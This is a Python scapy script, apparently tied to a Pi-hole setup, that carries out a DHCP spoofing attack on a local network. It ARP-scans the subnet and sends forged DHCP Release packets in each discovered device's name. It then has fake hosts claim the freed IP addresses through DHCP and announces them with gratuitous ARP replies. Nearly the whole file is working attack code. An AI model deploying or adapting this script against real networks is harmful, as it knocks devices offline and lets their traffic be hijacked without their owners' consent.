# dhcp.spoof.py
# Performs a targeted ARP Request scan to find existing hosts connected to network and "steal" their IP addresses


#### IMPORTS #### -------------------------------------------------------------------
import scapy.all as scapy
import json
import threading
import subprocess
from pathlib import Path
from itertools import zip_longest
from common import *
from utils import setup_logging, write_to_log, file_semaphore


#### CONFIG #### -------------------------------------------------------------------
timeout_to_receive_arp_reply = 5 # Time to wait to receive ARP Reply (seconds)
timeout_to_receive_dhcp_response = 30 # seconds
time_to_wait_between_release_and_discover = 10 # seconds
base_dir = Path(__file__).resolve().parent
log_file = base_dir / "logs" / "dhcp_spoof.log"

setup_logging(log_file)


#### FUNCTIONS #### ----------------------------------------------------------------
        
def get_unspoofed_ips(network_ip_addresses, spoofed_ip_dict):
    """
    Compares avalaible ip addresses with spoofed ips to return a list with non spoofed IP addresses
    """
    try:
        # Iterating for every fake_host in the dictionary
        for ip, host in spoofed_ip_dict.items():

            # Check if host is spoofed
            if host.is_spoofed:
                # Remove IP address from all IP addresses list
                network_ip_addresses.remove(ip)

        return network_ip_addresses
    except:
        # If an error occurs, return the whole address list
        return network_ip_addresses


def release_and_catch(existing_host_mac, existing_host_ip):
    """
    Release device's IP address and try to assign it to a new host
    """
    # Send DHCP Release to force a new IP address adquisition by the host
    write_to_log(f"Releasing IP address {existing_host_ip} from {existing_host_mac}")
    send_release(existing_host_mac, existing_host_ip, time_to_wait_between_release_and_discover, dhcp_server_ip, dhcp_server_mac, iface)

    # Create a new bogus host
    host = fake_host.create_host()

    # Perform a DORA handshake to catch new released IP address
    acquisition_successfull = perform_dhcp_discover_offer(host, timeout_to_receive_dhcp_response)

    # If IP acquisition is successfull, send 3 ARP Request announcing that "new" host to the rest of the network
    if acquisition_successfull:

        send_gratuitous_arp(host.mac_address, host.ip_address)


def perform_dhcp_discover_offer(host, timeout):
    """
    Perform a DHCP Discover-Offer transaction. 
    If a DHCP Offer is received, continues with Request-ACK
    """

    # Create new DHCP Discover packet
    dhcp_discover_packet = create_dhcp_discover_packet(host)

    # Send DHCP Discover
    scapy.sendp(dhcp_discover_packet, verbose=False, iface=iface)
    write_to_log(f"DHCP Discover sent: {host.mac_address} requesting a new IP address")

    # Waits until timeout or DHCP Response is received
    dhcp_discover_response = process_dhcp_packet(dhcp_discover_packet[scapy.BOOTP].xid, timeout)

    if dhcp_discover_response:

        # Update hosts parameters, like a new assigned IP address
        print(f"{dhcp_discover_response.summary()}")
        response_type = handle_dhcp_response(dhcp_discover_response, host)

        if response_type == "OFFER":

            write_to_log(f"DHCP Offer received: {host.mac_address} offered {host.ip_address}")
            # Return True if ip acquisition is successful
            return perform_dhcp_request_ack(host, timeout)

        elif response_type == "ACK":

            # ACK in this stage is expected if Rapid Commit is enabled on router. 
            write_to_log(f"DHCP ACK received: {host.mac_address} successfully linked to {host.ip_address}")
            host_dict = {}
            host_dict[host.ip_address] = host
            update_json_file(host_dict, json_file, file_semaphore)
            # IP acquisition successfull
            return True

        elif response_type == "NAK":

            #print(f"NAK received")
            write_to_log(f"DHCP NAK received: Failed to obtain an IP address for that host")
            return

        else:

            write_to_log(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_discover_packet[scapy.DHCP].options[0][1]}")
            return

    else:

        # If no response is received
        write_to_log("Timeout reached without receiving a valid DHCP Discover response.")
        return
    

def perform_dhcp_request_ack(host, timeout):
    """
    Completes the DHCP handshake process after receiving a DHCP Offer
    """

    # If Discover-Offer occurs, continue with DORA handshake
    dhcp_request_packet = create_broadcast_dhcp_request_packet(host, dhcp_server_ip)
    # Send DHCP Request
    scapy.sendp(dhcp_request_packet, verbose=False, iface=iface)
    write_to_log(f"DHCP Request sent: {host.mac_address} requesting {host.ip_address}")

    # Waits until timeout or DHCP Response is received
    dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout)

    # If there's response
    if dhcp_request_response:
        
        print(f"{dhcp_request_response.summary()}")
        # Check what kind of DHCP response is
        response_type = handle_dhcp_response(dhcp_request_response, host)

        if response_type == "ACK":
            # DORA handshake completed, saving new host to json file
            write_to_log(f"DHCP ACK received: {host.mac_address} successfully linked to {host.ip_address}")
            host_dict = {}
            host_dict[host.ip_address] = host
            update_json_file(host_dict, json_file, file_semaphore)
            # IP acquisition successfull
            return True
        elif response_type == "NAK":

            write_to_log(f"DHCP NAK received: {host.mac_address} failed to acquire {host.ip_address}")
                 
        else:
            write_to_log(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_request_packet[scapy.DHCP].options[0][1]}")
            return


def send_gratuitous_arp(host_mac, host_ip):
    """
    Send an ARP Request announcing defined IP-MAC association
    """
    # Create a broadcast ARP Request
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    arp_header = scapy.ARP(op=2, # 1=Request, 2=Reply 
                           pdst=host_ip, 
                           psrc=host_ip, 
                           hwsrc=host_mac)
    arp_request = ether_header/arp_header
    # Send 3 Gratuitous ARPs trying to force an IP renewal on the connected device
    for _ in range(3):
        scapy.sendp(arp_request, verbose=False, iface=iface)
    write_to_log(f"Sending Gratuitous ARP announcing {host_mac} - {host_ip}")


def arp_scan(target_ips):
    """
    Performs a targeted ARP request scan to find existing hosts on the network.
    Returns a list with hosts' (IP, MAC) tuples who have answered, except the router
    """

    write_to_log(f"ARP Discover: Sending an ARP Request for the following IP addresses:")
    grouped_ips = zip_longest(*[iter(target_ips)] * 4, fillvalue='')
    for ips in grouped_ips:
        write_to_log(f"{ips}")

    # ARP Request packet, one for every unspoofed ip address
    arp_requests = [scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) for ip in target_ips]
    # Send it and catch ARP Reply response(s)
    result, _ = scapy.srp(arp_requests, timeout=timeout_to_receive_arp_reply, verbose=True)

    # List to save hosts' (IP, MAC) tuples who have answered
    responsive_devices = []
    # For every response, checks if it's an ARP response and saves the responding host params
    for _ , received in result:
        if received.haslayer(scapy.ARP):
            arp_layer = received[scapy.ARP]
            # Checking if it's Reply
            if arp_layer.op == 2:
                ip_address = received.psrc
                mac_address = received.hwsrc.lower()
                responsive_devices.append((ip_address, mac_address.lower()))
    
    # Checks if someone of this hosts is the router/DHCP server
    for (ip, mac) in responsive_devices:
        is_router = check_if_router(ip)
        if is_router:
            # Read previous results 
            try:
                with file_semaphore:
                    with open(router_file, 'r') as file:
                        data = json.load(file)
                
                dhcp_server_dict = {ip: dhcp_server.from_dict(host_data) for ip, host_data in data.items()}

            except FileNotFoundError as e:
                write_to_log(f"File not found: {router_file}")
                dhcp_server_dict = {}
            except json.JSONDecodeError as e:
                write_to_log(f"Error decoding JSON file: {e}")
                dhcp_server_dict = {}
            except Exception as e:
                write_to_log(f"Unknown error during file read: {e}")
                dhcp_server_dict = {}

            # Update server information
            router = dhcp_server.create_server(ip, mac)
            dhcp_server_dict[ip] = router

            global dhcp_server_ip, dhcp_server_mac
            dhcp_server_ip = ip
            dhcp_server_mac = mac

            # Save new dhcp server information to JSON file
            serializable_dict = {ip: host.to_dict() for ip, host in dhcp_server_dict.items()}

            try:
                with file_semaphore:
                    with open(router_file, 'w') as file:
                        json.dump(serializable_dict, file, indent=4)
            except Exception as e:
                write_to_log(f"Error saving JSON file: {e}")

            # Removing router from responsive devices list
            responsive_devices.remove((ip,mac))
            break
    
    return responsive_devices
  

def get_dhcp_leases():
    """
    Reads /etc/pihole/dhcp.leases and loads its content to a dictionary
    That file contains PiHole's DHCP Server leased IP addresses and some information about every host
    """
    dhcp_leases = {}
    with open("/etc/pihole/dhcp.leases", 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) >= 5:
                #timestamp = parts[0]
                mac_address = parts[1]
                ip_address = parts[2]
                hostname = parts[3]
                #if len(parts) > 4:
                #    hostname += " " + " ".join(parts[4:])
                #dhcp_leases[mac_address] = {'timestamp': timestamp, 'ip_address': ip_address, 'hostname': hostname}
                dhcp_leases[mac_address] = {'ip_address': ip_address, 'hostname': hostname}
    return dhcp_leases


def check_if_router(ip_address):
    """
    Check if that IP address belongs to home network's router/DHCP server
    """
    try:
        # Execute the 'ip route' command
        route_output = subprocess.check_output(['/usr/sbin/ip', 'route', 'get', '8.8.8.8'], text=True)
        return ip_address in route_output
    except subprocess.CalledProcessError:
        return False
    

def update_found_devices_json(ip_mac_of_found_devices, spoofed_hosts):
    """
    Check and update known host JSON file with found devices
    """

    combined_dict = {}
    # Adding found devices information
    for ip, mac in ip_mac_of_found_devices:
        combined_dict[mac] = {"original_ip_address": ip, 
                              "mac_address": mac, 
                              "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

    # Adding spoofed devices information
    for mac, data in spoofed_hosts.items():
        combined_dict[mac] = {"actual_ip_address": data["ip_address"], 
                              "mac_address": mac,
                              "hostname": data["hostname"]}

    # Read known hosts JSON file
    try:
        with file_semaphore:
            with open(hosts_file, 'r') as file:
                file_dict = json.load(file)
        
    except FileNotFoundError as e:
        write_to_log(f"File not found: {hosts_file}")
        file_dict = {}
    except json.JSONDecodeError as e:
        write_to_log(f"Error decoding JSON file: {e}")
        file_dict = {}
    except Exception as e:
        write_to_log(f"Unknown error during file read: {e}")
        file_dict = {}

    file_dict.update(combined_dict)

    # Save combined  dictionary to JSON file
    try:
        with file_semaphore:
            with open(hosts_file, 'w') as file:
                json.dump(file_dict, file, indent=4)
    except Exception as e:
        raise Exception(f"Error saving JSON file: {e}") from e


def main():
    
    write_to_log(f"Starting DHCP spoofing process")
    # Get network interface assigned IP address and network network mask
    our_ip_address, _, our_netmask, _ = get_network_params(iface)
    
    # Getting all host avalaible IP addresses for network
    network_ip_addresses = get_hosts_from_network(our_ip_address, our_netmask)

    # Load previous spoofed hosts from json file
    spoofed_ip_dict = load_from_json(json_file, file_semaphore)

    # Getting Pi-hole DHCP Server's IP lease list
    spoofed_hosts = get_dhcp_leases()

    # Print existing host in Pihole's lease list
    if spoofed_hosts:
        write_to_log(f"Existing and spoofed devices:")
        for mac, info in spoofed_hosts.items():
            write_to_log(f"MAC: {mac}, IP: {info['ip_address']}, Hostname: {info['hostname']}")

    # Get a list with non spoofed host's IP addresses checking spoofed_ip_dict
    target_ips = get_unspoofed_ips(network_ip_addresses, spoofed_ip_dict)

    # Perform an ARP scan
    ip_mac_data = arp_scan(target_ips)

    # Update known hosts JSON file
    update_found_devices_json(ip_mac_data, spoofed_hosts)

    # Prints found devices on network
    if ip_mac_data:
        write_to_log(f"Found connected and unspoofed device(s):")
        for ip, mac in ip_mac_data:
            if mac == dhcp_server_mac:
                write_to_log(f"MAC:{mac} - IP:{ip} - DHCP Server")
            else:
                write_to_log(f"MAC:{mac} - IP:{ip}")

    else:
        write_to_log(f"ARP Discover concluded with no response")
        write_to_log(f"Service Terminated")
        exit()
  
    # Start response DHCP packet capture thread
    capture_thread = threading.Thread(target=capture_dhcp_packets, args=(captured_packets, our_mac_address, iface))
    capture_thread.daemon = True
    capture_thread.start()

    #write_to_log(f"Starting Release&Catch for all found devices")
    for ip, mac in ip_mac_data:

        # Try to release that host IP address and kidnap it
        write_to_log(f"Trying to spoof device: {ip} - {mac}")
        release_and_catch(mac, ip)
    
    write_to_log(f"Service Terminated")
    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as e:
        write_to_log(f"Service manually terminated")